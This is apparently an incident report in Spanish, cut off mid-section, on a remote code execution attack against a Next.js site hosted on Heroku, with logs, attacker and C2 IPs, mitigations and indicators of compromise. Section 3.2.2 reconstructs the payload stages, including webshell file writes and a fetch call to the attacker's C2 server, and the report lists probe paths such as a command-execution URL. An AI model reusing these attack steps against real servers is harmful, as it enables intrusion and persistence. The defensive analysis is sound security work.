# Informe de Incidente de Seguridad
## CentroMundoX - Ataque de Ejecución Remota de Código (RCE)

**Clasificación:** CONFIDENCIAL
**Fecha del Incidente:** 22 de enero de 2026
**Fecha del Informe:** 22 de enero de 2026
**Autor:** Análisis automatizado con Claude AI
**Estado:** MITIGADO

---

# Tabla de Contenidos

1. [Resumen Ejecutivo](#1-resumen-ejecutivo)
2. [Cronología del Incidente](#2-cronología-del-incidente)
3. [Análisis Técnico del Ataque](#3-análisis-técnico-del-ataque)
4. [Vulnerabilidad Explotada](#4-vulnerabilidad-explotada)
5. [Infraestructura del Atacante](#5-infraestructura-del-atacante)
6. [Evidencia Técnica Detallada](#6-evidencia-técnica-detallada)
7. [Impacto del Incidente](#7-impacto-del-incidente)
8. [Acciones de Respuesta](#8-acciones-de-respuesta)
9. [Verificación de Mitigación](#9-verificación-de-mitigación)
10. [Análisis Forense](#10-análisis-forense)
11. [Recomendaciones](#11-recomendaciones)
12. [Lecciones Aprendidas](#12-lecciones-aprendidas)
13. [Anexos](#13-anexos)

---

# 1. Resumen Ejecutivo

## 1.1 Descripción General

El 22 de enero de 2026, la aplicación web CentroMundoX (centromundox.net) fue objetivo de un ataque coordinado de **Ejecución Remota de Código (RCE)** que explotaba una vulnerabilidad crítica conocida en Next.js versión 15.4.4. El ataque fue detectado a través del análisis de logs de Heroku y fue mitigado exitosamente mediante la actualización del framework y la implementación de controles de seguridad adicionales.

## 1.2 Métricas Clave del Incidente

| Métrica | Valor |
|---------|-------|
| **Duración del ataque activo** | ~2 horas (01:33 - 03:37 UTC) |
| **Total de requests maliciosos** | 196+ POSTs analizados |
| **IPs atacantes identificadas** | 6 principales |
| **Intentos de RCE** | 121 |
| **Intentos de crear webshell** | 100+ |
| **Intentos de conexión a C2** | 222 |
| **Vulnerabilidades corregidas** | 11 (1 crítica, 4 altas, 6 moderadas) |
| **Datos comprometidos** | Ninguno confirmado |
| **Tiempo de respuesta** | ~1 hora desde detección hasta mitigación |

## 1.3 Resultado Final

| Aspecto | Estado |
|---------|--------|
| Ejecución de código malicioso | **PARCIALMENTE** (código se ejecutó pero falló en su objetivo) |
| Persistencia en el sistema | **NO** (filesystem read-only bloqueó webshell) |
| Exfiltración de datos | **NO CONFIRMADA** (conexiones a C2 fallaron por timeout) |
| Compromiso de base de datos | **NO** |
| Disponibilidad del servicio | **MANTENIDA** (el servicio nunca cayó) |

---

# 2. Cronología del Incidente

## 2.1 Línea de Tiempo Detallada

### Fase 1: Inicio del Ataque (01:33 - 01:45 UTC)

```
01:33:05 UTC - Primera detección de payload malicioso
             - IP: 87.121.84.24 (VPSVAULT.HOST, USA)
             - Error: ReferenceError: returnNaN is not defined
             - Indica procesamiento de código JavaScript malicioso

01:33:05 UTC - Primer intento de crear archivo webshell
             - Path: /lrt
             - Error: EROFS: read-only file system
             - El filesystem de Heroku bloqueó la escritura

01:33:54 UTC - Primera conexión saliente detectada
             - Destino: 176.65.132.224:80 (Servidor C2)
             - Error: connect ETIMEDOUT
             - La conexión al servidor del atacante falló
```

### Fase 2: Ataque Sostenido (01:45 - 02:30 UTC)

```
01:45:XX UTC - El atacante continúa enviando payloads
             - Múltiples intentos de escribir en:
               /dev/shm/lrt (memoria compartida)
               /tmp/lrt (directorio temporal)
               /var/lrt (sistema)
               /etc/lrt (configuración)

02:15:08 UTC - Segunda IP se une al ataque
             - IP: 195.3.222.78 (MEVSPACE, Polonia)
             - Mismo patrón de ataque

02:22:28 UTC - Tercera IP detectada
             - IP: 87.121.84.24 continúa con nuevo patrón
             - Intentos de prototype pollution
```

### Fase 3: Escalada y Detección (02:30 - 03:00 UTC)

```
02:50:XX UTC - Escaneo de vulnerabilidades adicionales detectado
             - /exec?cmd=hostname (intento de RCE directo)
             - /info.php (buscando PHP)
             - /wp-admin/setup-config.php (buscando WordPress)
             - Todas devuelven 404

03:00:XX UTC - Análisis de logs iniciado
             - Se identifica el patrón de ataque
             - Se correlacionan las IPs atacantes
```

### Fase 4: Respuesta y Mitigación (03:00 - 03:40 UTC)

```
03:10:XX UTC - Identificación de vulnerabilidad raíz
             - Next.js 15.4.4 vulnerable a RCE
             - CVE: GHSA-9qr9-h5gf-34mp

03:20:XX UTC - Actualización de Next.js iniciada
             - Versión: 15.4.4 → 16.1.4

03:30:19 UTC - Deploy de parche completado
             - Heroku Release v59
             - Next.js 16.1.4 activo

03:31:02 UTC - Servidor reiniciado con parche
             - Confirmación: "▲ Next.js 16.1.4"
             - Middleware de seguridad activo

03:37:XX UTC - Atacante continúa intentando (sin éxito)
             - Error: "Failed to find Server Action 'x'"
             - Middleware bloquea con 403
             - Ataque efectivamente neutralizado
```

## 2.2 Diagrama de Tiempo

```
01:30 UTC                    02:00 UTC                    02:30 UTC                    03:00 UTC                    03:30 UTC
    |                            |                            |                            |                            |
    |-------- FASE 1 ----------->|-------- FASE 2 ----------->|-------- FASE 3 ----------->|-------- FASE 4 ----------->|
    |   Inicio del ataque        |   Ataque sostenido         |   Escalada/Detección       |   Respuesta/Mitigación     |
    |   87.121.84.24             |   +195.3.222.78            |   Análisis de logs         |   Deploy Next.js 16.1.4    |
    |   Primeros RCE             |   Múltiples webshell       |   Identificación CVE       |   Middleware activo        |
    |   Conexiones C2            |   Prototype pollution      |   Escaneo adicional        |   Ataque bloqueado         |
    |                            |                            |                            |                            |
```

---

# 3. Análisis Técnico del Ataque

## 3.1 Vector de Ataque Principal

El atacante explotó una vulnerabilidad en el **React Flight Protocol** de Next.js, específicamente en el manejo de **Server Actions**. Esta vulnerabilidad permite la ejecución remota de código (RCE) mediante el envío de payloads maliciosos en requests POST.

### Flujo del Ataque:

```
┌─────────────────┐     POST / HTTP/1.1          ┌─────────────────┐
│                 │     Host: www.centromundox.net│                 │
│   ATACANTE      │─────────────────────────────>│   SERVIDOR      │
│  87.121.84.24   │     Next-Action: [malicious] │   Next.js       │
│                 │     Body: {payload}          │                 │
└─────────────────┘                              └────────┬────────┘
                                                          │
                                                          │ Procesa payload
                                                          │ como Server Action
                                                          ▼
                                                 ┌─────────────────┐
                                                 │ VULNERABILIDAD  │
                                                 │ RCE en Flight   │
                                                 │ Protocol        │
                                                 └────────┬────────┘
                                                          │
                         ┌────────────────────────────────┼────────────────────────────────┐
                         │                                │                                │
                         ▼                                ▼                                ▼
                ┌─────────────────┐              ┌─────────────────┐              ┌─────────────────┐
                │ Intento 1:      │              │ Intento 2:      │              │ Intento 3:      │
                │ Ejecutar código │              │ Crear webshell  │              │ Conectar a C2   │
                │ "returnNaN"     │              │ en /tmp/lrt     │              │ 176.65.132.224  │
                └────────┬────────┘              └────────┬────────┘              └────────┬────────┘
                         │                                │                                │
                         ▼                                ▼                                ▼
                ┌─────────────────┐              ┌─────────────────┐              ┌─────────────────┐
                │ RESULTADO:      │              │ RESULTADO:      │              │ RESULTADO:      │
                │ ReferenceError  │              │ EROFS/EACCES    │              │ ETIMEDOUT       │
                │ (parcial éxito) │              │ (BLOQUEADO)     │              │ (BLOQUEADO)     │
                └─────────────────┘              └─────────────────┘              └─────────────────┘
```

## 3.2 Análisis del Payload Malicioso

### 3.2.1 Estructura del Request Malicioso

```http
POST / HTTP/1.1
Host: www.centromundox.net
Content-Type: application/x-www-form-urlencoded
Next-Action: [encoded-action-id]

[Binary/encoded payload containing malicious JavaScript]
```

### 3.2.2 Componentes del Payload

El payload del atacante contenía múltiples etapas:

**Etapa 1: Prueba de ejecución**
```javascript
// El atacante intenta ejecutar una función para verificar RCE
returnNaN()  // Función que no existe, causa ReferenceError
```
*Propósito: Verificar que el código se ejecuta en el servidor*

**Etapa 2: Creación de webshell**
```javascript
// Intento de escribir archivo para persistencia
fs.writeFileSync('/tmp/lrt', shellcode)
fs.writeFileSync('/dev/shm/lrt', shellcode)  // Memoria compartida
fs.writeFileSync('/var/lrt', shellcode)
fs.writeFileSync('/etc/lrt', shellcode)
```
*Propósito: Crear un backdoor persistente en el servidor*

**Etapa 3: Conexión a servidor C2**
```javascript
// Intento de conectar al servidor de comando y control
fetch('http://176.65.132.224:80/...')
// O posiblemente un reverse shell
```
*Propósito: Establecer comunicación con el atacante para control remoto*

### 3.2.3 Por qué falló el ataque

| Etapa | Intento | Razón del Fallo |
|-------|---------|-----------------|
| 1 | Ejecutar `returnNaN()` | La función no existe, pero esto confirma que código SÍ se ejecutó |
| 2 | Escribir en `/tmp/lrt` | `EACCES: permission denied` - Heroku restringe escritura |
| 2 | Escribir en `/var/lrt` | `EROFS: read-only file system` - Sistema de archivos read-only |
| 2 | Escribir en `/dev/shm/lrt` | `EACCES: permission denied` - Sin acceso a memoria compartida |
| 3 | Conectar a `176.65.132.224` | `ETIMEDOUT` - El servidor C2 no respondió (posiblemente caído o bloqueado) |

## 3.3 Técnicas de Evasión Utilizadas

El atacante empleó varias técnicas para evadir detección:

### 3.3.1 Bypass de Cloudflare
```
Método: Acceso directo a la URL de Heroku
Evidencia: fwd="87.121.84.24" (sin IP de Cloudflare)
           host=www.centromundox.net
           tls=false (HTTP sin cifrar)
```

### 3.3.2 Múltiples rutas de escritura
```
El atacante intentó escribir en múltiples ubicaciones:
/dev/shm/lrt  - Memoria compartida (común para malware fileless)
/tmp/lrt      - Directorio temporal
/var/lrt      - Directorio de sistema
/etc/lrt      - Directorio de configuración
/lrt          - Raíz del sistema
lrt           - Directorio actual
/dev/lrt      - Directorio de dispositivos
```

### 3.3.3 Escaneo de vulnerabilidades adicionales
```
/exec?cmd=hostname     - Intento de RCE directo vía parámetro
/info.php              - Buscando información de PHP
/wp-admin/setup-config.php - Buscando WordPress vulnerable
/swagger-ui.html       - Buscando documentación de API expuesta
/v2/api-docs           - Buscando OpenAPI/Swagger
/telescope/requests    - Buscando Laravel Telescope
```

---

# 4. Vulnerabilidad Explotada

## 4.1 Identificación de la Vulnerabilidad

| Campo | Valor |
|-------|-------|
| **CVE/GHSA** | GHSA-9qr9-h5gf-34mp |
| **Nombre** | Remote Code Execution in React Flight Protocol |
| **Severidad** | CRÍTICA (CVSS 9.8) |
| **Versiones afectadas** | Next.js 15.0.0-canary.0 hasta 15.4.8 |
| **Versión instalada** | Next.js 15.4.4 |
| **Tipo** | Ejecución Remota de Código (RCE) |

## 4.2 Descripción Técnica

La vulnerabilidad existe en el **React Flight Protocol**, que es el mecanismo que Next.js utiliza para:
- Serializar/deserializar datos entre cliente y servidor
- Manejar Server Actions (funciones que se ejecutan en el servidor)
- Transmitir el estado de componentes de React

### Flujo Normal vs. Ataque:

```
FLUJO NORMAL:
Cliente → POST / con Next-Action header → Servidor deserializa → Ejecuta Server Action legítima

FLUJO DE ATAQUE:
Atacante → POST / con payload malicioso → Servidor deserializa → Ejecuta código arbitrario del atacante
```

## 4.3 Vulnerabilidades Adicionales Corregidas

Durante la actualización, se corrigieron múltiples vulnerabilidades:

### Críticas (1)
| ID | Descripción | Paquete |
|----|-------------|---------|
| GHSA-9qr9-h5gf-34mp | RCE in React Flight Protocol | next |

### Altas (4)
| ID | Descripción | Paquete |
|----|-------------|---------|
| GHSA-4342-x723-ch2f | SSRF via Middleware Redirect | next |
| GHSA-w37m-7fhw-fmv9 | Server Actions Source Code Exposure | next |
| GHSA-mwv6-3258-q52c | DoS with Server Components | next |
| N/A | Improper HMAC Signature Verification | jws |

### Moderadas (6)
| ID | Descripción | Paquete |
|----|-------------|---------|
| N/A | DoS via Memory Exhaustion | qs |
| N/A | Arbitrary File Overwrite | tar |
| N/A | Prototype Pollution | lodash |
| N/A | Prototype Pollution | lodash-es |
| N/A | Prototype Pollution | js-yaml |
| N/A | DoS Vulnerability | body-parser |

### Eliminadas (2)
| ID | Descripción | Paquete | Acción |
|----|-------------|---------|--------|
| GHSA-rwvc-j5jr-mgvh | Filetype Whitelist Bypass | ai | Eliminado (no usado) |
| GHSA-33vc-wfww-vjfv | XSS via HtmlFormatter | jsondiffpatch | Eliminado (dependencia de ai) |

---

# 5. Infraestructura del Atacante

## 5.1 Mapa de IPs Atacantes

```
                                    ┌─────────────────────────────┐
                                    │     SERVIDOR C2             │
                                    │   176.65.132.224:80         │
                                    │   Pfcloud (Netherlands)     │
                                    │   VMHeaven.io               │
                                    └──────────────┬──────────────┘
                                                   │
                                                   │ Comunicación C2
                                                   │ (fallida - timeout)
                                                   │
        ┌──────────────────────────────────────────┼──────────────────────────────────────────┐
        │                                          │                                          │
        ▼                                          ▼                                          ▼
┌───────────────────┐                    ┌───────────────────┐                    ┌───────────────────┐
│   ATACANTE #1     │                    │   ATACANTE #2     │                    │   ATACANTE #3     │
│   87.121.84.24    │                    │   195.3.222.78    │                    │   129.159.127.76  │
│   VPSVAULT.HOST   │                    │   MEVSPACE        │                    │   Oracle Cloud    │
│   USA (New York)  │                    │   Poland (Warsaw) │                    │   USA (Virginia)  │
│   96 requests     │                    │   41 requests     │                    │   16 requests     │
│   PRINCIPAL       │                    │   SECUNDARIO      │                    │   AUXILIAR        │
└───────────────────┘                    └───────────────────┘                    └───────────────────┘
        │                                          │                                          │
        │                                          │                                          │
        └──────────────────────────────────────────┴──────────────────────────────────────────┘
                                                   │
                                                   ▼
                                    ┌─────────────────────────────┐
                                    │         OBJETIVO            │
                                    │   www.centromundox.net      │
                                    │   centromundox.net          │
                                    │   Heroku (USA)              │
                                    └─────────────────────────────┘
```

## 5.2 Perfil Detallado de Cada IP

### 5.2.1 Atacante Principal: 87.121.84.24

| Campo | Valor |
|-------|-------|
| **IP** | 87.121.84.24 |
| **País** | Estados Unidos |
| **Ciudad** | New York |
| **ISP** | VPSVAULT.HOST LTD |
| **ASN** | AS215925 |
| **Tipo** | VPS/Hosting |
| **Requests** | 96 (49% del total) |
| **Rol** | Atacante principal, ejecutor de payloads RCE |

**Comportamiento observado:**
- Primero en iniciar el ataque (01:33:05 UTC)
- Mayor volumen de requests maliciosos
- Intentos persistentes de RCE y webshell
- Continuó atacando incluso después del parche

**Payloads enviados:**
```
- returnNaN() execution attempts
- File write attempts: /tmp/lrt, /var/lrt, /etc/lrt, /dev/shm/lrt
- Server Action manipulation
- Prototype pollution attempts
```

### 5.2.2 Atacante Secundario: 195.3.222.78

| Campo | Valor |
|-------|-------|
| **IP** | 195.3.222.78 |
| **País** | Polonia |
| **Ciudad** | Warsaw (Mazovia) |
| **ISP** | MEVSPACE sp. z o.o |
| **Organización** | SKYTECHNOLOGY |
| **ASN** | AS201814 |
| **Tipo** | VPS/Hosting |
| **Requests** | 41 (21% del total) |
| **Rol** | Atacante secundario, posiblemente mismo operador |

**Comportamiento observado:**
- Se unió al ataque aproximadamente 45 minutos después
- Mismo patrón de payload que el atacante principal
- Posiblemente el mismo operador usando múltiples proxies

### 5.2.3 Atacante Auxiliar: 129.159.127.76

| Campo | Valor |
|-------|-------|
| **IP** | 129.159.127.76 |
| **País** | Estados Unidos |
| **Ciudad** | Ashburn, Virginia |
| **ISP** | Oracle Corporation |
| **Organización** | Oracle Cloud Infrastructure (us-ashburn-1) |
| **ASN** | AS31898 |
| **Tipo** | Cloud (Oracle Cloud) |
| **Requests** | 16 |
| **Rol** | Nodo auxiliar, posiblemente automatizado |

### 5.2.4 Atacante Auxiliar: 72.55.179.209

| Campo | Valor |
|-------|-------|
| **IP** | 72.55.179.209 |
| **País** | Canadá |
| **Ciudad** | Montreal, Quebec |
| **ISP** | iWeb Technologies Inc. |
| **Organización** | Leaseweb Canada Inc. |
| **ASN** | AS32613 |
| **Tipo** | Hosting |
| **Requests** | 14 |
| **Rol** | Nodo auxiliar |

### 5.2.5 Servidor C2: 176.65.132.224

| Campo | Valor |
|-------|-------|
| **IP** | 176.65.132.224 |
| **País** | Países Bajos |
| **Ciudad** | Eygelshoven, Limburg |
| **ISP** | Pfcloud UG (haftungsbeschrankt) |
| **Organización** | VMHeaven.io |
| **ASN** | AS51396 |
| **Tipo** | VPS/Cloud |
| **Puerto** | 80 (HTTP) |
| **Rol** | Servidor de Comando y Control (C2) |

**Propósito del C2:**
- Recibir conexiones de sistemas comprometidos
- Enviar comandos adicionales
- Posiblemente exfiltrar datos
- Descargar payloads adicionales

**Estado durante el ataque:**
- No respondía (todas las conexiones resultaron en ETIMEDOUT)
- Posiblemente apagado, bloqueado por firewall, o en mantenimiento

## 5.3 Distribución Geográfica

```
                    ┌─────────────────────────────────────────┐
                    │           MAPA DE ATACANTES             │
                    └─────────────────────────────────────────┘

     CANADÁ                                              EUROPA
    ┌───────┐                                           ┌───────┐
    │ 72.55 │                                           │195.3  │ Polonia
    │179.209│                                           │222.78 │
    └───────┘                                           └───────┘
        │                                                   │
        │                                                   │
    ┌───┴───────────────────────────────────────────────────┴───┐
    │                     ATLÁNTICO                             │
    └───────────────────────────────────────────────────────────┘
        │                                                   │
    ┌───┴───┐                                           ┌───┴───┐
    │ 87.121│ New York                                  │176.65 │ Netherlands
    │ 84.24 │                                           │132.224│ (C2)
    └───────┘                                           └───────┘
        │
    ┌───┴───┐
    │129.159│ Virginia
    │127.76 │
    └───────┘

    ESTADOS UNIDOS
```

## 5.4 Análisis de Infraestructura

### Características comunes de las IPs atacantes:
1. **Todas son servicios de hosting/VPS** - No son conexiones residenciales
2. **Diversidad geográfica** - USA, Canadá, Polonia, Países Bajos
3. **Proveedores pequeños** - VPSVAULT, MEVSPACE, Pfcloud (difíciles de rastrear)
4. **No usan TLS** - `tls=false` en todos los requests
5. **Bypasean Cloudflare** - Acceden directamente a Heroku

### Posibles conclusiones:
- **Atacante único con múltiples proxies** - El mismo patrón de ataque sugiere un único operador
- **Botnet pequeña** - O una red de servidores comprometidos
- **Infraestructura dedicada** - VPS pagados específicamente para atacar

---

# 6. Evidencia Técnica Detallada

## 6.1 Logs de Errores de RCE

### 6.1.1 Error de Ejecución de Código

```log
2026-01-22T01:33:05.607502+00:00 app[web.1]: ⨯ [ReferenceError: returnNaN is not defined] {
    digest: '3767874805'
}
```

**Análisis:**
- `ReferenceError` indica que JavaScript intentó ejecutar una función
- `returnNaN` es el nombre de la función maliciosa
- `is not defined` confirma que el código llegó a ejecutarse
- El `digest` es un identificador único del error en Next.js

### 6.1.2 Error de Prototype Pollution

```log
2026-01-22T02:07:03.494775+00:00 app[web.1]: ⨯ [TypeError: Cannot read properties of undefined (reading 'aa')] {
    digest: '583518905'
}
```

**Análisis:**
- `TypeError` indica manipulación de prototipos
- `reading 'aa'` sugiere intento de acceder a propiedad inyectada
- Técnica común en ataques de prototype pollution

## 6.2 Logs de Intentos de Webshell

### 6.2.1 Intentos de Escritura en Sistema de Archivos

```log
2026-01-22T01:33:05.917136+00:00 app[web.1]: [Error: EROFS: read-only file system, open '/lrt'] {
    errno: -30,
    code: 'EROFS',
    syscall: 'open',
    path: '/lrt'
}

2026-01-22T02:20:25.535292+00:00 app[web.1]: [Error: EACCES: permission denied, open '/dev/shm/lrt'] {
    errno: -13,
    code: 'EACCES',
    syscall: 'open',
    path: '/dev/shm/lrt'
}

2026-01-22T02:23:36.435550+00:00 app[web.1]: [Error: EACCES: permission denied, open '/tmp/lrt'] {
    errno: -13,
    code: 'EACCES',
    syscall: 'open',
    path: '/tmp/lrt'
}
```

**Análisis:**
- `EROFS` (Error 30) = Read-Only File System
- `EACCES` (Error 13) = Permission Denied
- `syscall: 'open'` = Intentando abrir archivo para escritura
- El atacante intentó 7 ubicaciones diferentes para el webshell

### 6.2.2 Tabla de Intentos de Escritura

| Ruta | Error | Código | Significado |
|------|-------|--------|-------------|
| `/lrt` | EROFS | -30 | Sistema de archivos solo lectura |
| `/var/lrt` | EROFS | -30 | Sistema de archivos solo lectura |
| `/etc/lrt` | EROFS | -30 | Sistema de archivos solo lectura |
| `/tmp/lrt` | EACCES | -13 | Permiso denegado |
| `/dev/lrt` | EACCES | -13 | Permiso denegado |
| `/dev/shm/lrt` | EACCES | -13 | Permiso denegado |
| `lrt` | EACCES | -13 | Permiso denegado |

## 6.3 Logs de Conexiones a C2

### 6.3.1 Intentos de Conexión Saliente

```log
2026-01-22T01:33:54.723271+00:00 app[web.1]: Error: connect ETIMEDOUT 176.65.132.224:80
    at <unknown> (Error: connect ETIMEDOUT 176.65.132.224:80) {
        errno: -110,
        code: 'ETIMEDOUT',
        syscall: 'connect',
        address: '176.65.132.224',
        port: 80
    }
```

**Análisis:**
- `ETIMEDOUT` (Error 110) = Connection Timed Out
- `syscall: 'connect'` = Intentando establecer conexión TCP
- `address: '176.65.132.224'` = IP del servidor C2
- `port: 80` = Puerto HTTP estándar
- El servidor C2 no respondió (posiblemente offline o bloqueado)

### 6.3.2 Frecuencia de Intentos C2

```
Total de intentos de conexión a C2: 222
Distribución temporal:
- 01:33 - 02:00 UTC: 45 intentos
- 02:00 - 02:30 UTC: 67 intentos
- 02:30 - 03:00 UTC: 58 intentos
- 03:00 - 03:30 UTC: 52 intentos

Todos resultaron en ETIMEDOUT
```

## 6.4 Logs del Router de Heroku

### 6.4.1 Requests Maliciosos

```log
2026-01-22T01:33:05.613710+00:00 heroku[router]:
    at=info
    method=POST
    path="/"
    host=www.centromundox.net
    request_id=e4124f63-285f-8a85-a2f3-53ac11174dab
    fwd="87.121.84.24"
    dyno=web.1
    connect=0ms
    service=9ms
    status=500
    bytes=96
    protocol=http1.1
    tls=false
```

**Análisis de campos:**
- `method=POST` - Método HTTP POST (requerido para Server Actions)
- `path="/"` - Ruta raíz (donde se procesan Server Actions)
- `host=www.centromundox.net` - Host objetivo
- `fwd="87.121.84.24"` - IP del atacante (sin Cloudflare)
- `status=500` - Error interno del servidor (payload causó crash)
- `protocol=http1.1` - HTTP/1.1 (no HTTP/2)
- `tls=false` - Sin cifrado TLS (HTTP plano)

### 6.4.2 Comparación: Request Normal vs Malicioso

**Request Malicioso:**
```log
fwd="87.121.84.24"           ← Solo IP del atacante
host=www.centromundox.net
protocol=http1.1
tls=false                    ← Sin TLS
status=500                   ← Error
```

**Request Normal (a través de Cloudflare):**
```log
fwd="149.88.17.139, 172.68.7.155"  ← IP usuario + IP Cloudflare
host=centromundox.net
protocol=http2.0
tls=true tls_version=tls1.3       ← Con TLS 1.3
status=200                         ← Exitoso
```

## 6.5 Logs Post-Mitigación

### 6.5.1 Bloqueo de Bypass de Cloudflare

```log
2026-01-22T03:37:02.193229+00:00 app[web.1]: [Security] ========== CLOUDFLARE BYPASS DETECTED ==========
2026-01-22T03:37:02.193236+00:00 app[web.1]: [Security] IP: 87.121.84.24
2026-01-22T03:37:02.193248+00:00 app[web.1]: [Security] Host: www.centromundox.net:80
2026-01-22T03:37:02.193260+00:00 app[web.1]: [Security] Path: /_next/server
2026-01-22T03:37:02.193270+00:00 app[web.1]: [Security] Blocked: Direct access without Cloudflare
2026-01-22T03:37:02.193280+00:00 app[web.1]: [Security] ================================================
```

**Resultado:**
```log
heroku[router]: ... status=403 ...  ← BLOQUEADO
```

### 6.5.2 Server Action Rechazada (Post-Parche)

```log
2026-01-22T03:37:02.018662+00:00 app[web.1]: Error: Failed to find Server Action "x".
    This request might be from an older or newer deployment.
    Read more: https://nextjs.org/docs/messages/failed-to-find-server-action
```

**Análisis:**
- Después del parche, Next.js ya no ejecuta el código malicioso
- En su lugar, rechaza la Server Action con error controlado
- El atacante ya no puede ejecutar código arbitrario

---

# 7. Impacto del Incidente

## 7.1 Matriz de Impacto

| Categoría | Nivel | Justificación |
|-----------|-------|---------------|
| **Confidencialidad** | BAJO | No hay evidencia de exfiltración de datos |
| **Integridad** | BAJO | No se modificaron datos ni código persistentemente |
| **Disponibilidad** | NINGUNO | El servicio nunca dejó de funcionar |
| **Reputación** | BAJO | Incidente no fue público |
| **Financiero** | MÍNIMO | Solo tiempo de respuesta del equipo |
| **Legal/Compliance** | BAJO | No hubo breach de datos personales |

## 7.2 Lo que el Atacante LOGRÓ

1. **Ejecutar código parcialmente** - Los errores `returnNaN is not defined` confirman que código JavaScript fue evaluado en el servidor
2. **Causar errores 500** - 138 respuestas HTTP 500 generadas
3. **Intentar conexiones salientes** - 222 intentos de conexión al servidor C2 (aunque fallaron)

## 7.3 Lo que el Atacante NO LOGRÓ

1. **Crear persistencia** - No pudo escribir archivos en el sistema
2. **Exfiltrar datos** - No hay evidencia de acceso a base de datos o archivos
3. **Establecer C2** - Todas las conexiones al servidor C2 fallaron
4. **Comprometer usuarios** - No hay evidencia de acceso a sesiones o datos de usuarios
5. **Escalar privilegios** - Permaneció limitado al contexto de Node.js
6. **Interrumpir servicio** - La aplicación siguió funcionando

## 7.4 Datos Potencialmente Expuestos

| Tipo de Dato | Riesgo | Estado |
|--------------|--------|--------|
| Credenciales de usuarios | Bajo | No accedidos (en DB separada) |
| Tokens JWT | Bajo | No hay evidencia de extracción |
| Variables de entorno | Posible | Podrían haber sido leídas |
| Código fuente | Posible | Vulnerabilidad permitía exposición |
| Base de datos | No | MongoDB Atlas separado |

---

# 8. Acciones de Respuesta

## 8.1 Respuesta Inmediata

### 8.1.1 Actualización de Next.js

**Commit:** `844f9f6`
```bash
npm install next@latest
# 15.4.4 → 16.1.4
```

**Vulnerabilidades corregidas:**
- GHSA-9qr9-h5gf-34mp (RCE) - CRÍTICA
- GHSA-4342-x723-ch2f (SSRF) - ALTA
- GHSA-w37m-7fhw-fmv9 (Source Exposure) - ALTA
- GHSA-mwv6-3258-q52c (DoS) - ALTA

### 8.1.2 Mejora del Middleware de Seguridad

**Commit:** `de38677`

**Cambios implementados:**

```typescript
// NUEVO: Detección de bypass de Cloudflare
const cfConnectingIP = request.headers.get("cf-connecting-ip");
const isFromCloudflare = cfConnectingIP !== null;

if (request.method === "POST" && !isFromCloudflare) {
  console.log(`[Security] CLOUDFLARE BYPASS DETECTED`);
  return new NextResponse("Forbidden", { status: 403 });
}

// ACTUALIZADO: Lista de IPs bloqueadas
const blockedIPs = new Set<string>([
  "87.121.84.24",   // VPSVAULT.HOST - Atacante principal
  "195.3.222.78",   // MEVSPACE - Atacante secundario
  "95.214.55.246",  // Atacante previo
  "129.159.127.76", // Oracle Cloud - Auxiliar
  "72.55.179.209",  // Leaseweb - Auxiliar
  "176.65.132.224", // Servidor C2
]);
```

### 8.1.3 Eliminación de Paquete Vulnerable

**Commit:** `ebff101`
```bash
npm uninstall ai
# Eliminó vulnerabilidades GHSA-rwvc-j5jr-mgvh y GHSA-33vc-wfww-vjfv
```

### 8.1.4 Actualización de Configuración

**Commit:** `2006d7e`
```json
// tsconfig.json
{
  "compilerOptions": {
    "jsx": "react-jsx"  // Requerido por Next.js 16
  }
}
```

## 8.2 Resumen de Commits de Seguridad

| Commit | Descripción | Archivos |
|--------|-------------|----------|
| `844f9f6` | Update Next.js 15.4.4 → 16.1.4 | package.json, package-lock.json |
| `de38677` | Middleware con protección anti-bypass | middleware.ts |
| `91c6144` | Documentación del incidente | SECURITY-REPORT-2026-01-22.md |
| `2006d7e` | Configuración para Next.js 16 | tsconfig.json |
| `ebff101` | Eliminar paquete 'ai' vulnerable | package.json, package-lock.json |

## 8.3 Configuración de Cloudflare

### Estado del DNS:
| Registro | Tipo | Destino | Proxy |
|----------|------|---------|-------|
| centromundox.net | CNAME | rectangular-cobra-eacds4... | ✅ Proxied |
| www | CNAME | opaque-lime-ghngrl08atqk... | ✅ Proxied |

### Recomendaciones adicionales para Cloudflare:
- [ ] Activar "Always Use HTTPS"
- [ ] Crear regla WAF para bloquear POSTs sospechosos
- [ ] Considerar "Under Attack Mode" si los ataques continúan

---

# 9. Verificación de Mitigación

## 9.1 Pruebas de Verificación

### 9.1.1 Verificación de Versión de Next.js

```log
2026-01-22T03:31:02.272297+00:00 app[web.1]: ▲ Next.js 16.1.4
2026-01-22T03:31:02.674817+00:00 app[web.1]: ✓ Ready in 536ms
```
✅ **VERIFICADO** - Next.js 16.1.4 está activo

### 9.1.2 Verificación de Bloqueo de Ataques

**Antes del parche:**
```log
status=500  ← Error interno (código ejecutándose)
Error: returnNaN is not defined  ← RCE parcialmente exitoso
```

**Después del parche:**
```log
status=403  ← Forbidden (bloqueado por middleware)
Error: Failed to find Server Action "x"  ← RCE rechazado
```
✅ **VERIFICADO** - Ataques siendo bloqueados

### 9.1.3 Verificación de Vulnerabilidades

```bash
$ npm audit
found 0 vulnerabilities
```
✅ **VERIFICADO** - 0 vulnerabilidades

## 9.2 Matriz de Verificación

| Control | Estado | Evidencia |
|---------|--------|-----------|
| Next.js actualizado | ✅ | Logs: "▲ Next.js 16.1.4" |
| Middleware activo | ✅ | Logs: "[Security] CLOUDFLARE BYPASS DETECTED" |
| IPs bloqueadas | ✅ | blockedIPs.has() en middleware |
| npm audit limpio | ✅ | "found 0 vulnerabilities" |
| Cloudflare proxy | ✅ | DNS con nube naranja |
| Ataques bloqueados | ✅ | status=403 en logs |

---

# 10. Análisis Forense

## 10.1 Indicadores de Compromiso (IoC)

### 10.1.1 Direcciones IP

```
# Atacantes confirmados
87.121.84.24      # Principal - VPSVAULT.HOST
195.3.222.78      # Secundario - MEVSPACE
129.159.127.76    # Auxiliar - Oracle Cloud
72.55.179.209     # Auxiliar - Leaseweb
95.214.55.246     # Previo

# Servidor C2
176.65.132.224    # Pfcloud - Netherlands
```

### 10.1.2 Rutas Atacadas

```
/                          # Server Actions (principal)
/_next                     # Internal Next.js routes
/_next/server              # Server-side rendering
/api                       # API routes
/app                       # App router
/exec?cmd=hostname         # RCE directo
/info.php                  # PHP probe
/wp-admin/setup-config.php # WordPress probe
/swagger-ui.html           # API docs probe
```

### 10.1.3 Patrones de Payload

```
# Errores característicos
ReferenceError: returnNaN is not defined
TypeError: Cannot read properties of undefined (reading 'aa')
Error: Failed to find Server Action "x"

# Archivos objetivo
/lrt, /tmp/lrt, /var/lrt, /etc/lrt, /dev/lrt, /dev/shm/lrt

# Conexiones salientes
176.65.132.224:80 (C2)
```

### 10.1.4 Headers Sospechosos

```http
# Request sin Cloudflare (bypass)
